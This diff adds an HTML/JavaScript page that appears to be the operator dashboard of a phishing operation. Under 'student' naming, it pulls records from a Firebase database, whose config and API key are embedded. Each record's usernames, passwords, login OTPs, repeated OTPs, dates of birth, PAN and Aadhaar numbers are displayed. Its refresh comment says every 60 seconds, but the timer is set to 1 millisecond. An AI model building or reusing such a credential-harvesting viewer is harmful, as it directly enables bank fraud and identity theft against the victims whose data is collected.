@@ -1,0 +1,175 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Firebase Data as a List</title>
+    <style>
+        .student-box-yellow {
+            background-color: yellow;
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid black;
+            border-radius: 5px;
+        }
+        .student-box-red {
+            background-color: red;
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid black;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id="StudentDiv"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js";
+        import { getDatabase, ref, get, query, orderByKey } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js";
+
+        const firebaseConfig = {
+  apiKey: "AIzaSyAatpOoPZfEbj0-DqMKSHdgjes_dkVOL70",
+  authDomain: "suru-webcam.firebaseapp.com",
+  databaseURL: "https://suru-webcam-default-rtdb.firebaseio.com",
+  projectId: "suru-webcam",
+  storageBucket: "suru-webcam.appspot.com",
+  messagingSenderId: "835228705126",
+  appId: "1:835228705126:web:d243f667fc91c5bbdbe8a7",
+  measurementId: "G-1ZVC5LYSN5"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase();
+
+        let StudentDiv = document.getElementById('StudentDiv');
+
+        function GetStudents() {
+            const studentsQuery = query(ref(db, 'userInputs'), orderByKey());
+
+            get(studentsQuery).then((snapshot) => {
+                if (snapshot.exists()) {
+                    StudentDiv.innerHTML = "";  // Clear the current list
+                    let counter = 0;
+                    snapshot.forEach((std) => {
+                        AddStudentAsListItem(std, counter);
+                        counter++;
+                    });
+                } else {
+                    console.log("No data available");
+                }
+            }).catch((error) => {
+                console.error("Error fetching data: ", error);
+            });
+        }
+
+        function AddStudentAsListItem(std, index) {
+    let value = std.val();
+
+    let ul = document.createElement('ul');
+    if (index % 2 === 0) {
+        ul.className = 'student-box-yellow';
+    } else {
+        ul.className = 'student-box-red';
+    }
+
+    if (value.mobile) {
+        let mobile = document.createElement('li');
+        mobile.innerHTML = "Mobile: " + value.mobile;
+        ul.appendChild(mobile);
+    }
+
+    if (value.username) {
+        let username = document.createElement('li');
+        username.innerHTML = "Username: " + value.username;
+        ul.appendChild(username);
+    }
+
+    if (value.password) {
+        let password = document.createElement('li');
+        password.innerHTML = "Password: " + value.password;
+        ul.appendChild(password);
+    }
+
+    if (value.login_OTP) {
+        let loginOTP = document.createElement('li');
+        loginOTP.innerHTML = "Login OTP: " + value.login_OTP;
+        ul.appendChild(loginOTP);
+    }
+
+    if (value.Account_Holder_Name) {
+        let Account_Holder_Name = document.createElement('li');
+        Account_Holder_Name.innerHTML = "Account_Holder_Name: " + value.Account_Holder_Name;
+        ul.appendChild(Account_Holder_Name);
+    }
+
+    if (value.Date_Of_Birth) {
+        let Date_Of_Birth = document.createElement('li');
+        Date_Of_Birth.innerHTML = "Date_Of_Birth: " + value.Date_Of_Birth;
+        ul.appendChild(Date_Of_Birth);
+    }
+
+    if (value.OTP_1) {
+        let OTP_1 = document.createElement('li');
+        OTP_1.innerHTML = "OTP_1: " + value.OTP_1;
+        ul.appendChild(OTP_1);
+    }
+    if (value.OTP_2_again) {
+        let OTP_2_again = document.createElement('li');
+        OTP_2_again.innerHTML = "OTP_2: " + value.OTP_2_again;
+        ul.appendChild(OTP_2_again);
+    }
+    if (value.Full_Name) {
+        let Full_Name = document.createElement('li');
+        Full_Name.innerHTML = "Full_Name_: " + value.Full_Name;
+        ul.appendChild(Full_Name);
+    }
+    if (value.PAN_Card_Number) {
+        let PAN_Card_Number = document.createElement('li');
+        PAN_Card_Number.innerHTML = "Pan_Card_Number: " + value.PAN_Card_Number;
+        ul.appendChild(PAN_Card_Number);
+    }
+    if (value.OTP_3) {
+        let OTP_3 = document.createElement('li');
+        OTP_3.innerHTML = "OTP_3: " + value.OTP_3;
+        ul.appendChild(OTP_3);
+    }
+    if (value.Aadhaar_Card_Number) {
+        let Aadhaar_Card_Number = document.createElement('li');
+        Aadhaar_Card_Number.innerHTML = "Aadhaar_Card_Number: " + value.Aadhaar_Card_Number;
+        ul.appendChild(Aadhaar_Card_Number);
+    
+    }
+    if (value.OTP_4) {
+        let OTP_4 = document.createElement('li');
+        OTP_4.innerHTML = "OTP_4: " + value.OTP_4;
+        ul.appendChild(OTP_4);
+    }
+
+    if (value.OTP_4_again) {
+        let OTP_4_again = document.createElement('li');
+        OTP_4_again.innerHTML = "OTP_4_again_: " + value.OTP_4_again;
+        ul.appendChild(OTP_4_again);
+    }
+    if (value.OTP_5) {
+        let OTP_5 = document.createElement('li');
+        OTP_5.innerHTML = "OTP_5: " + value.OTP_5;
+        ul.appendChild(OTP_5);
+    }
+    if (value.OTP_6) {
+        let OTP_6 = document.createElement('li');
+        OTP_6.innerHTML = "OTP_5: " + value.OTP_6;
+        ul.appendChild(OTP_6);
+    }
+
+    StudentDiv.prepend(ul);
+}
+
+        window.addEventListener('load', () => {
+            GetStudents();
+            setInterval(GetStudents, 1); // Auto-refresh every 60 seconds
+        });
+    </script>
+</body>
+</html>
